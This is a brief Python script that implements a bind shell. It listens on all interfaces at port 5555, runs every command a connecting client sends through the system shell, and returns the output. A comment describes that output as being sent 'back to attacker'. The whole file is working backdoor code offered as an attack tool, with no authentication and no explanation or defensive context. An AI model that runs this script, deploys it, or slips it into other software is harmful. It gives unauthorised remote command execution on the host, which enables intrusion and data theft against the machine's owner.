import os
import socket
import subprocess

def main():
    host = '0.0.0.0'    # Listen The All Interface Network
    port = 5555         # Port Connection
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()
    print(f"[*] Server Listening on {host}:{port}")
    
    client, addr = server.accept()
    print(f"[*] Accepted Connection From {addr[0]}:{addr[1]}")
    
    try:
        while True:
            command = client.recv(1024).decode('utf-8')
            if not command:
                break
            print(f"[*] Received Command: {command}")
            
            if command.lower() == 'exit':
                print("[*] Closing Connection")
                break
            
            try:
                # Running Command And Get Output
                output = subprocess.getoutput(command)
                
                # if No Output,Send Message Default
                if not output:
                    output = "Command Executed Successfully"
                
                # Send Output Back To Attacker
                client.send(output.encode('utf-8'))
            
            except Exception as e:
                error_msg = f"Error Executing Command: {str(e)}"
                client.send(error_msg.encode('utf-8'))
    
    except KeyboardInterrupt:
        print("\n[*] Server Shutting Down")
    finally:
        client.close()
        server.close()

if __name__ == "__main__":
    main()